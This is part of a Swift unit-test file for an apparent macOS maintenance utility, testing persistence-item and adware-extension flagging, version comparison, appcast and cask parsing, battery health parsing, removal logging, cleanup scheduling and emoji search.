        let ad = PersistenceItem(path: "/Library/LaunchDaemons/com.searchmine.daemon.plist", label: "com.searchmine.daemon",
                                 program: "/Library/Application Support/.x/run", signedBy: nil)
        XCTAssertEqual(PersistenceAnalyzer.analyze(ad).severity, .suspicious)
        let gone = PersistenceItem(path: "/Users/a/Library/LaunchAgents/com.old.app.plist", label: "com.old.app",
                                   program: "/Applications/Old.app/Contents/MacOS/helper", signedBy: "Old Inc", programExists: false)
        XCTAssertEqual(PersistenceAnalyzer.analyze(gone).severity, .review)
        XCTAssertEqual(PersistenceAnalyzer.analyzeExtension(name: "Search Baron", id: "x", path: "p").severity, .suspicious)
    }

    func testVersions() {
        XCTAssertTrue(VersionCompare.isNewer("1.10", than: "1.9"))
        XCTAssertFalse(VersionCompare.isNewer("2.0", than: "2"))
        XCTAssertTrue(VersionCompare.isNewer("v3.1.2", than: "3.1.1"))
        XCTAssertFalse(VersionCompare.isNewer("1.2.0", than: "1.2.1"))
    }

    func testAppcastAndCask() {
        let xml = """
        <rss><channel>
        <item><title>1.2</title><enclosure url="https://x/1.2.zip" sparkle:version="120" sparkle:shortVersionString="1.2"/></item>
        <item><title>1.10</title><sparkle:shortVersionString>1.10</sparkle:shortVersionString><enclosure url="https://x/1.10.zip" length="1"/></item>
        </channel></rss>
        """
        let l = Appcast.latest(in: xml)!
        XCTAssertEqual(l.version, "1.10")
        XCTAssertEqual(l.url, "https://x/1.10.zip")
        let cask = #"[{"token":"visual-studio-code","version":"1.95.3","homepage":"https://code.visualstudio.com/","artifacts":[{"app":["Visual Studio Code.app"]},{"zap":[{}]}]}]"#
        let c = CaskInfo.parse(cask.data(using: .utf8)!)
        XCTAssertEqual(c.first?.appNames, ["Visual Studio Code.app"])
        XCTAssertEqual(c.first?.version, "1.95.3")
    }

    func testBatteryParse() {
        let io = """
        +-o AppleSmartBattery  <class AppleSmartBattery>
            "CycleCount" = 312
            "DesignCapacity" = 5103
            "AppleRawMaxCapacity" = 4390
            "CurrentCapacity" = 81
            "MaxCapacity" = 100
            "IsCharging" = Yes
            "Temperature" = 3051
        """
        let b = BatteryHealth.parse(ioreg: io)!
        XCTAssertEqual(b.cycleCount, 312)
        XCTAssertEqual(b.healthPercent, 86)
        XCTAssertEqual(b.currentCharge, 81)
        XCTAssertTrue(b.isCharging)
        XCTAssertEqual(b.temperatureC!, 30.51, accuracy: 0.001)
        XCTAssertNil(BatteryHealth.parse(ioreg: "nothing here"))
    }

    func testRemovalLogAndSchedule() {
        var log = RemovalLog()
        let t = Date()
        log.append(RemovalRecord(date: t, originalPath: "/a", trashedPath: "/T/a", size: 1, module: "Junk", reason: "r"))
        log.append(RemovalRecord(date: t.addingTimeInterval(10), originalPath: "/b", trashedPath: nil, size: 1, module: "Junk", reason: "r"))
        log.append(RemovalRecord(date: t.addingTimeInterval(9999), originalPath: "/c", trashedPath: "/T/c", size: 1, module: "Junk", reason: "r"))
        XCTAssertEqual(log.sessions().count, 2)
        XCTAssertFalse(log.records.first { $0.originalPath == "/b" }!.canRestore)
        let id = log.records.first { $0.originalPath == "/a" }!.id
        log.markRestored(id)
        XCTAssertFalse(log.records.first { $0.id == id }!.canRestore)

        var s = CleanupSchedule()
        XCTAssertNil(s.nextRun(after: t))
        s.frequency = .weekly
        var cal = Calendar(identifier: .gregorian)
        cal.timeZone = TimeZone(identifier: "UTC")!
        let monday = Date(timeIntervalSince1970: 1_793_000_000) // a fixed instant
        s.lastRun = monday
        let next = s.nextRun(after: monday, calendar: cal)!
        XCTAssertEqual(next.timeIntervalSince(monday), 7 * 86400, accuracy: 86400)
        XCTAssertFalse(s.isDue(now: monday.addingTimeInterval(86400), calendar: cal))
        XCTAssertTrue(s.isDue(now: monday.addingTimeInterval(8 * 86400), calendar: cal))
    }

    func testEmojiCatalog() {
        XCTAssertGreaterThan(EmojiCatalog.all.count, 500)
        XCTAssertTrue(EmojiCatalog.search("grinning").contains { $0.emoji == "😀" })
        XCTAssertTrue(EmojiCatalog.search("thumbs up").contains { $0.emoji == "👍" })
    }

    func testMaintenanceCatalog() {
        XCTAssertEqual(Set(MaintenanceTask.all.map(\.id)).count, MaintenanceTask.all.count)
        XCTAssertTrue(MaintenanceTask.all.allSatisfy { !$0.explanation.isEmpty })
    }
}
